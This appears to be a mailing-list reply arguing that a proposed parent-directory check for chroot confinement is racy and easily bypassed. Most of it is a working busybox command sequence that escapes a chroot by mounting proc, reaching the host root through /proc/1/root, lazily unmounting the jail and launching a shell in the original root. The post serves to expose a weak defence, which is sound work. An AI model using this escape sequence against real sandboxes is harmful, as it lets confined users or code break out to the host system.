This is basically both painfully racy and easily broken with umount  
and/or access to proc.  See this busybox-compatible example:
## Set up chroot
mkdir /root1
mount -o mode=0750 -t tmpfs tmpfs /root1
cp -a /bin/busybox /root1/busybox
## Enter chroot
chroot /root1 /busybox
## Mount proc
/busybox mkdir /proc
/busybox mount -t proc proc /proc
## Poke around root filesystem (this may be all you need)
/busybox ls /proc/1/root/
## Detach our chroot so we're no longer a sub-directory
/busybox umount -l /proc/1/root/root1
## Now we can easily chroot to the original root, since it isn't in  
our ".." path
exec /busybox chroot /proc/1/root /bin/sh
See how easy that is?  Unless you stick the above parent-directory  
check (which is still racy against directories being moved around)  
for *EVERY* directory component of *EVERY* open/chdir-ish syscall,  
you are still going to be easily worked around through many different  
methods.
